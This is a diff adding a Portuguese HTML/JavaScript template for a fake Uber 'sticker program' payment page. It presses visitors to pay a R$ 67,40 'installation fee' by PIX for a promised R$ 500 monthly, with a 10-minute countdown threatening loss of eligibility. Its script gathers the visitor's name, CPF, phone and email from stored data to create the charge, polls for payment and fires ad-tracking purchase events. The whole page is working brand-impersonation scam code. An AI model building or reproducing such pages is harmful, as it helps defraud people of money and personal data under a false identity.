@@ -1,0 +1,588 @@
+{% extends "layout.html" %}
+
+{% block title %}Pagamento do Adesivo Uber{% endblock %}
+
+{% block content %}
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "s4nz0u51fp");
+</script>
+<div class="container mx-auto px-4 py-6 max-w-6xl">
+    <!-- Header -->
+    <div class="text-center">
+        <!-- Alert Icon -->
+        <div class="mb-4">
+            <img src="https://cdn-icons-png.flaticon.com/512/5610/5610989.png" alt="Alerta" class="mx-auto w-16 h-16 mb-4">
+        </div>
+        
+        <div class="mb-4">
+            <h1 class="text-3xl md:text-5xl font-bold text-gray-800 leading-tight">Taxa de Instalação Obrigatória</h1>
+        </div>
+        
+        <div class="bg-gray-100 p-6 md:p-10 mb-4 text-center" style="border-radius: 0px !important;">
+            <p class="text-gray-800 text-base md:text-xl font-medium leading-relaxed mb-6">
+                <strong>ATENÇÃO:</strong> O pagamento da Taxa de Instalação no valor de <strong>R$ 67,40</strong> é obrigatório para participar do programa.
+            </p>
+            
+            <!-- Imagem dentro da box -->
+            <img src="https://i.ibb.co/wNmGb11S/assets-task-01jyhvmxk2ea7an1jzt95pfapt-1750798711-img-0.webp" alt="Programa Uber" class="mx-auto max-w-full h-auto rounded-lg">
+        </div>
+    </div>
+
+    <!-- Instalação Information -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <h2 class="text-xl font-bold mb-4 text-gray-800">Instalação Obrigatória por Funcionário Autorizado</h2>
+        
+        <div class="bg-white border border-gray-200 p-4 mb-4" style="border-radius: 0px !important;">
+            <p class="text-gray-700 text-sm leading-relaxed mb-3">
+                O adesivo do programa deve ser instalado exclusivamente por um <strong>funcionário autorizado da Uber</strong>. Ele se deslocará até o seu endereço para realizar a instalação.
+            </p>
+            <ul class="text-gray-700 text-sm space-y-2 ml-4">
+                <li>• Instalar o adesivo na posição correta do veículo</li>
+                <li>• Tirar foto oficial do adesivo instalado</li>
+                <li>• Validar a instalação no sistema Uber</li>
+            </ul>
+        </div>
+        
+        <div class="bg-gray-100 p-4 mb-4" style="border-radius: 0px !important;">
+            <h3 class="font-semibold text-gray-800 mb-2">Importante</h3>
+            <p class="text-gray-700 text-sm leading-relaxed">
+                <strong>Sem o pagamento desta Taxa de Instalação, você não participará do programa e não receberá os pagamentos mensais de R$ 500,00 por 3 anos.</strong> O  código de pagamento expira em <strong>10 minutos.</strong>
+            </p>
+        </div>
+        
+
+    <!-- Payment Summary -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <h2 class="text-xl font-bold mb-4 text-gray-800">Resumo do Pagamento</h2>
+        
+        <div class="space-y-3">
+            <div class="flex justify-between items-center border-b pb-2">
+                <span class="text-gray-600">Taxa de Instalação:</span>
+                <span class="font-medium">R$ 67,40</span>
+            </div>
+            <div class="flex justify-between items-center border-b pb-2">
+                <span class="text-gray-600">Instalação Autorizada:</span>
+                <span class="font-medium">Incluído</span>
+            </div>
+            <div class="flex justify-between items-center border-b pb-2">
+                <span class="text-gray-600">Foto Oficial:</span>
+                <span class="font-medium">Incluído</span>
+            </div>
+            <div class="flex justify-between items-center text-lg font-bold text-black bg-gray-100 p-3" style="border-radius: 0px !important;">
+                <span>Total a Pagar:</span>
+                <span>R$ 67,40</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Section -->
+    <div class="bg-white shadow-lg p-6 mb-6" style="border-radius: 0px !important;">
+        <!-- Alert Icon -->
+        <div class="text-center mb-4">
+            <img src="https://icones.pro/wp-content/uploads/2021/05/symbole-d-avertissement-jaune.png" alt="Alerta" class="mx-auto w-16 h-16">
+        </div>
+        
+        <!-- Status Box -->
+        <div class="bg-yellow-50 border border-yellow-200 p-4 mb-4 text-center" style="border-radius: 0px !important;">
+            <!-- Animated Loading Dots -->
+            <div class="loading-container" style="margin-bottom: 12px;">
+                <div class="loading-dots">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+            </div>
+            <p class="text-yellow-800 font-medium">Após o pagamento um funcionário da Uber entrará em contato para agendar o dia da aplicação e registro no programa de parceiros da Uber.</p>
+        </div>
+        
+        <div class="bg-gray-50 border p-4 mb-4" style="border-radius: 0px !important;">
+            <!-- Loading Message -->
+            <div id="loadingMessage" class="text-center text-gray-600 py-4">
+                Gerando pagamento PIX...
+            </div>
+            
+            <!-- PIX QR Code -->
+            <div class="text-center mb-4">
+                <img id="pixQrCode" style="display: none;" class="mx-auto border shadow-sm" width="180" height="180" style="border-radius: 0px !important;">
+            </div>
+            
+            <!-- PIX Code Section -->
+            <div id="pixCodeSection" style="display: none;" class="mb-4">
+                <label class="block text-sm font-medium text-gray-700 mb-2">Código PIX (Copia e Cola):</label>
+                <input 
+                    type="text" 
+                    id="pixCode" 
+                    readonly 
+                    class="w-full border border-gray-300 px-3 py-2 bg-white text-xs mb-3"
+                    style="border-radius: 0px !important;"
+                    placeholder="Código PIX será gerado automaticamente..."
+                >
+                <button 
+                    onclick="copyPixCode()" 
+                    class="w-full bg-green-600 hover:bg-green-700 text-white px-4 py-2 text-sm font-medium"
+                    style="border-radius: 0px !important;"
+                    id="copyButton"
+                >
+                    Copiar Código Pix
+                </button>
+            </div>
+            
+        </div>
+        
+        <!-- Countdown Timer -->
+        <div class="mt-6 bg-red-50 border-2 border-red-200 rounded p-4 text-center">
+            <div class="text-2xl font-bold text-red-600 mb-2">
+                ⏰ Tempo restante: <span id="countdown">10:00</span>
+            </div>
+            <div class="text-red-700 font-medium">
+                ⚠️ Este PIX expira em 10 minutos. Após esse prazo, se o pagamento não for concluído, 
+                você perderá o direito ao programa de Parceiros Uber.
+            </div>
+        </div>
+        
+    </div>
+</div>
+
+<style>
+.loading-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.loading-dots {
+    display: flex;
+    gap: 4px;
+}
+
+.dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background-color: #f59e0b;
+    animation: pulse 1.4s ease-in-out infinite both;
+}
+
+.dot:nth-child(1) {
+    animation-delay: -0.32s;
+}
+
+.dot:nth-child(2) {
+    animation-delay: -0.16s;
+}
+
+.dot:nth-child(3) {
+    animation-delay: 0;
+}
+
+@keyframes pulse {
+    0%, 80%, 100% {
+        transform: scale(0.6);
+        opacity: 0.5;
+    }
+    40% {
+        transform: scale(1);
+        opacity: 1;
+    }
+}
+</style>
+
+<script>
+// Auto-generate PIX payment on page load
+document.addEventListener('DOMContentLoaded', async function() {
+    try {
+        // Get user data from localStorage - check all possible sources
+        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+        const paymentData = JSON.parse(localStorage.getItem('cnvPaymentData') || '{}');
+        const loginUserData = JSON.parse(localStorage.getItem('loginUserData') || '{}');
+        
+        // Try multiple localStorage keys for user data (prioritize login data)
+        const userName = (
+            loginUserData.nome ||
+            paymentData.name || 
+            userData.full_name || 
+            userData.name || 
+            localStorage.getItem('candidateName') || 
+            localStorage.getItem('userName') || 
+            ''
+        );
+        
+        const userCPF = (
+            loginUserData.cpf ||
+            paymentData.cpf || 
+            userData.cpf || 
+            localStorage.getItem('candidateCPF') || 
+            localStorage.getItem('userCPF') || 
+            ''
+        );
+        
+        const userPhone = (
+            loginUserData.telefone ||
+            paymentData.phone || 
+            userData.phone || 
+            localStorage.getItem('candidatePhone') || 
+            localStorage.getItem('userPhone') || 
+            ''
+        );
+        
+        const userEmail = (
+            loginUserData.email ||
+            paymentData.email || 
+            userData.email || 
+            localStorage.getItem('candidateEmail') || 
+            localStorage.getItem('userEmail') || 
+            ''
+        );
+        
+        console.log('Extracted user data:', { name: userName, cpf: userCPF, phone: userPhone, email: userEmail });
+        
+        // Debug localStorage contents
+        console.log('All localStorage keys:', Object.keys(localStorage));
+        console.log('Login user data:', loginUserData);
+        console.log('Payment data:', paymentData);
+        console.log('User data:', userData);
+        for (let key in localStorage) {
+            console.log(`localStorage.${key}:`, localStorage.getItem(key));
+        }
+        
+        if (userName && userCPF) {
+            const payloadData = {
+                name: userName,
+                cpf: userCPF,
+                email: userEmail,
+                phone: userPhone
+            };
+            
+            console.log('Sending payload:', payloadData);
+            
+            // Create payment using existing endpoint
+            const response = await fetch('/create_cnv_payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payloadData)
+            });
+            
+            const result = await response.json();
+            console.log('API Response:', result);
+            
+            if (result.success && result.payment_data) {
+                const pixData = result.payment_data;
+                console.log('PIX Data:', pixData);
+                
+                // Display real PIX code
+                if (pixData.pixCopyPaste) {
+                    document.getElementById('pixCode').value = pixData.pixCopyPaste;
+                    document.getElementById('pixCodeSection').style.display = 'block';
+                    console.log('PIX code set successfully');
+                }
+                
+                // Display real QR Code
+                if (pixData.pixQrCode) {
+                    const qrCodeElement = document.getElementById('pixQrCode');
+                    qrCodeElement.src = pixData.pixQrCode;
+                    qrCodeElement.style.display = 'block';
+                    console.log('QR Code displayed successfully');
+                }
+                
+                // Store payment ID for status checking
+                if (pixData.paymentId) {
+                    localStorage.setItem('cnvPaymentId', pixData.paymentId);
+                    console.log('Payment ID stored:', pixData.paymentId);
+                    
+                    // Start CNV payment monitoring
+                    startCNVPaymentMonitoring(pixData.paymentId);
+                }
+                
+                // Hide loading message
+                document.getElementById('loadingMessage').style.display = 'none';
+                
+            } else {
+                throw new Error(result.error || 'Erro ao criar pagamento PIX');
+            }
+        } else {
+            console.error('Dados do usuário incompletos:', { name: userName, cpf: userCPF, phone: userPhone });
+            document.getElementById('loadingMessage').innerHTML = `
+                <div class="text-red-600">
+                    Dados do usuário não encontrados no localStorage.<br>
+                    Nome: ${userName || 'não encontrado'}<br>
+                    CPF: ${userCPF || 'não encontrado'}<br>
+                    <a href="/" class="text-blue-600 underline">Voltar ao início</a>
+                </div>
+            `;
+        }
+    } catch (error) {
+        console.error('Erro ao criar pagamento:', error);
+        document.getElementById('loadingMessage').innerHTML = `
+            <div class="text-red-600">
+                Erro ao carregar dados de pagamento: ${error.message}<br>
+                <a href="/" class="text-blue-600 underline">Voltar ao início</a>
+            </div>
+        `;
+    }
+});
+
+// Meta Pixel Purchase Event Function for CNV Payment
+function fireMetaPixelCNVPurchaseEvent(transactionData) {
+    try {
+        // Get user data from localStorage (from login or payment flow)
+        const loginData = JSON.parse(localStorage.getItem('loginUserData') || '{}');
+        const userData = {
+            candidateName: loginData.nome || localStorage.getItem('candidateName') || '',
+            candidateEmail: loginData.email || localStorage.getItem('candidateEmail') || '',
+            candidatePhone: loginData.telefone || localStorage.getItem('candidatePhone') || '',
+            candidateCPF: loginData.cpf || localStorage.getItem('candidateCPF') || '',
+            candidateCity: loginData.cidade || localStorage.getItem('candidateCity') || '',
+            candidateState: loginData.estado || localStorage.getItem('candidateState') || '',
+            candidateZipCode: loginData.cep || localStorage.getItem('candidateZipCode') || ''
+        };
+        
+        // Get campaign data
+        const campaignInfo = JSON.parse(localStorage.getItem('campaignData') || '{}');
+        
+        // Purchase event data for CNV payment
+        const purchaseValue = transactionData.payment_amount || 67.40;
+        const transactionId = transactionData.transaction_id;
+        
+        // Customer data for Facebook (will be automatically hashed)
+        const customerData = {};
+        if (userData.candidateEmail) customerData.em = userData.candidateEmail.toLowerCase().trim();
+        if (userData.candidatePhone) customerData.ph = userData.candidatePhone.replace(/\D/g, '');
+        if (userData.candidateName) {
+            const nameParts = userData.candidateName.trim().toLowerCase().split(' ');
+            if (nameParts.length >= 1) customerData.fn = nameParts[0];
+            if (nameParts.length >= 2) customerData.ln = nameParts[nameParts.length - 1];
+        }
+        if (userData.candidateCity) customerData.ct = userData.candidateCity.toLowerCase().trim();
+        if (userData.candidateState) customerData.st = userData.candidateState.toLowerCase().trim();
+        if (userData.candidateZipCode) customerData.zp = userData.candidateZipCode.replace(/\D/g, '');
+        if (userData.candidateCPF) customerData.external_id = userData.candidateCPF.replace(/\D/g, '');
+        
+        // Event parameters
+        const eventData = {
+            value: purchaseValue,
+            currency: 'BRL',
+            content_type: 'product',
+            content_ids: [transactionId],
+            content_name: 'Uber Sticker Installation Fee',
+            content_category: 'Installation'
+        };
+        
+        // Add campaign data if available
+        if (campaignInfo.fbclid) eventData.fbclid = campaignInfo.fbclid;
+        if (campaignInfo.utm_source) eventData.utm_source = campaignInfo.utm_source;
+        if (campaignInfo.utm_medium) eventData.utm_medium = campaignInfo.utm_medium;
+        if (campaignInfo.utm_campaign) eventData.utm_campaign = campaignInfo.utm_campaign;
+        
+        // Fire Purchase event for all configured pixels
+        if (typeof fbq !== 'undefined') {
+            // Force immediate firing with explicit tracking
+            fbq('track', 'Purchase', eventData, customerData);
+            
+            // Additional forced tracking attempts
+            setTimeout(() => fbq('track', 'Purchase', eventData, customerData), 50);
+            setTimeout(() => fbq('track', 'Purchase', eventData, customerData), 150);
+            
+            console.log('✅ Meta Pixel CNV Purchase event fired successfully!');
+            console.log('CNV Event Data:', eventData);
+            console.log('CNV Customer Data:', customerData);
+            console.log('CNV Campaign Data:', campaignInfo);
+            
+            // Send test event to verify pixel is working
+            fbq('trackCustom', 'UberInstallationPurchase', {
+                value: eventData.value,
+                currency: 'BRL',
+                transaction_id: eventData.content_ids[0]
+            });
+            console.log('✅ Custom UberInstallationPurchase event also fired!');
+            
+        } else {
+            console.error('❌ Facebook Pixel (fbq) not loaded - CNV Purchase event not fired');
+            console.error('window.fbq status:', typeof window.fbq);
+            console.error('Available globals:', Object.keys(window).filter(k => k.includes('fb')));
+            
+            // Force manual pixel initialization as last resort
+            if (typeof window.fbq === 'undefined') {
+                console.log('Attempting manual pixel recovery...');
+                setTimeout(() => {
+                    if (typeof window.fbq !== 'undefined') {
+                        console.log('Pixel recovered! Firing delayed CNV Purchase event...');
+                        window.fbq('track', 'Purchase', eventData, customerData);
+                    }
+                }, 2000);
+            }
+        }
+        
+    } catch (error) {
+        console.error('Error firing Meta Pixel CNV Purchase event:', error);
+    }
+}
+
+// CNV Payment Monitoring System
+function startCNVPaymentMonitoring(paymentId) {
+    let checkCount = 0;
+    const MAX_CHECKS = 600; // 10 minutes
+    
+    function checkCNVPaymentStatus() {
+        if (checkCount >= MAX_CHECKS) {
+            console.log('CNV payment monitoring timeout');
+            return;
+        }
+        
+        checkCount++;
+        console.log(`CNV payment check #${checkCount} for ID: ${paymentId}`);
+        
+        fetch(`/check_cnv_payment_status/${paymentId}`)
+            .then(response => response.json())
+            .then(data => {
+                console.log('CNV payment status:', data);
+                
+                if (data.status === 'completed' || data.status === 'APPROVED') {
+                    console.log('✅ CNV Payment APPROVED! Firing Meta Pixel Purchase event...');
+                    clearInterval(cnvPaymentInterval);
+                    
+                    // Fire Meta Pixel Purchase event IMMEDIATELY
+                    fireMetaPixelCNVPurchaseEvent({
+                        transaction_id: paymentId,
+                        payment_amount: data.payment_amount || 52.10,
+                        status: 'completed'
+                    });
+                    
+                    // Fire TikTok Pixel Purchase event
+                    if (typeof ttq !== 'undefined') {
+                        try {
+                            ttq.track('CompletePayment', {
+                                value: data.payment_amount || 52.10,
+                                currency: 'BRL',
+                                content_id: paymentId,
+                                content_type: 'product'
+                            });
+                            console.log('✅ TikTok Pixel CNV Purchase event fired!');
+                        } catch (e) {
+                            console.log('TikTok Pixel error:', e);
+                        }
+                    }
+                    
+                    // Force pixel events to fire with multiple attempts
+                    setTimeout(() => {
+                        fireMetaPixelCNVPurchaseEvent({
+                            transaction_id: paymentId,
+                            payment_amount: data.payment_amount || 52.10,
+                            status: 'completed'
+                        });
+                    }, 100);
+                    
+                    setTimeout(() => {
+                        fireMetaPixelCNVPurchaseEvent({
+                            transaction_id: paymentId,
+                            payment_amount: data.payment_amount || 67.40,
+                            status: 'completed'
+                        });
+                    }, 300);
+                    
+                    // Redirect after ensuring pixel fires
+                    setTimeout(() => {
+                        console.log('Redirecting to success page...');
+                        window.location.href = '/parcerias/approved';
+                    }, 1000);
+                }
+            })
+            .catch(error => {
+                console.error('Error checking CNV payment:', error);
+            });
+    }
+    
+    // Start monitoring
+    const cnvPaymentInterval = setInterval(checkCNVPaymentStatus, 1000);
+    
+    // Initial check
+    setTimeout(checkCNVPaymentStatus, 100);
+}
+
+// Countdown timer function
+let countdownTime = 10 * 60; // 10 minutes in seconds
+
+function updateCountdown() {
+    const minutes = Math.floor(countdownTime / 60);
+    const seconds = countdownTime % 60;
+    const formattedTime = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+    
+    const countdownElement = document.getElementById('countdown');
+    if (countdownElement) {
+        countdownElement.textContent = formattedTime;
+        
+        // Change color as time runs out
+        if (countdownTime <= 120) { // Last 2 minutes - red
+            countdownElement.style.color = '#DC2626';
+        } else if (countdownTime <= 300) { // Last 5 minutes - orange
+            countdownElement.style.color = '#EA580C';
+        }
+    }
+    
+    if (countdownTime <= 0) {
+        // Timer expired
+        if (countdownElement) {
+            countdownElement.textContent = 'EXPIRADO';
+            countdownElement.style.color = '#DC2626';
+        }
+        
+        // Show expiration message
+        document.body.innerHTML = `
+            <div class="min-h-screen bg-gray-100 flex items-center justify-center px-4">
+                <div class="max-w-md mx-auto bg-white rounded-lg shadow-lg p-8 text-center">
+                    <div class="text-6xl mb-4">⏰</div>
+                    <h1 class="text-2xl font-bold text-red-600 mb-4">PIX Expirado</h1>
+                    <p class="text-gray-700 mb-6">
+                        O tempo limite de 10 minutos foi ultrapassado. 
+                        Você perdeu o direito ao programa de Parceiros Uber.
+                    </p>
+                    <a href="/" class="bg-black text-white px-6 py-3 rounded font-medium hover:bg-gray-800">
+                        Voltar ao Início
+                    </a>
+                </div>
+            </div>
+        `;
+        return;
+    }
+    
+    countdownTime--;
+}
+
+// Start countdown when page loads
+document.addEventListener('DOMContentLoaded', function() {
+    // Start the countdown immediately
+    updateCountdown();
+    // Update every second
+    setInterval(updateCountdown, 1000);
+});
+
+// Copy PIX code function
+function copyPixCode() {
+    const pixCodeInput = document.getElementById('pixCode');
+    pixCodeInput.select();
+    pixCodeInput.setSelectionRange(0, 99999);
+    
+    try {
+        document.execCommand('copy');
+        
+        const button = event.target.closest('button');
+        const originalText = button.textContent;
+        button.textContent = 'Copiado!';
+        button.classList.add('bg-green-600');
+        
+        setTimeout(() => {
+            button.textContent = originalText;
+            button.classList.remove('bg-green-600');
+        }, 2000);
+        
+    } catch (err) {
+        alert('Erro ao copiar código PIX');
+    }
+}
+</script>
+{% endblock %}
